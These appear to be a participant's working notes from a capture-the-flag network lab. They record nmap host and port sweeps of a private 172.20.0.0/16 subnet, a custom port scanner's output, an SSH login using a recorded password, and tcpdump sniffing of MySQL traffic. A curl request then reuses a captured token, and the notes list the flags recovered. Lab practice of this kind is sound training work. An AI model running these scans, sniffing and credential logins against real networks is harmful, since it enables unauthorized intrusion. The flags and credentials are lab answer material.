sudo setcap cap_net_raw,cap_net_admin+ep ~/.venv/bin/python

## Find live hosts only
sudo nmap -sn -T4 -n 172.20.0.0/24

## Scan live IPs

sudo nmap -sn -n 172.20.0.0/16 -oG hosts.txt
awk '/Up$/{print $2}' hosts.txt > live.txt

sudo nmap -T4 -n -iL live.txt

## Parallellism
sudo nmap -T4 -n --min-rate 5000 172.20.0.0/16


## 
172.20.0.40


## Open ports

python port_scanner/main.py -t 172.20.0.10,172.20.0.11,172.20.0.20,172.20.0.21,172.20.0.21,172.20.0.22,172.20.0.30,172.20.0.40 -p 1-10000

[+] 172.20.0.10:5000 open
[+] 172.20.0.11:3306 open
[+] 172.20.0.20:2222 open
[+] 172.20.0.21:8888 open
[+] 172.20.0.22:6379 open



ssh -p 2222 root@172.20.0.20
username: sshuser
pass: SecurePass2024!
flag 2:
FLAG{h1dd3n_s3rv1c3s_n33d_pr0t3ct10n}



sudo tcpdump -i br-e0376de1ebe7 -A -s 0 'port 3306'
Flag 3: 
FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}

curl -H "Authorization: Bearer FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}" \
http://172.20.0.21:8888/flag

FLAG{p0rt_kn0ck1ng_4nd_h0n3yp0ts_s4v3_th3_d4y}


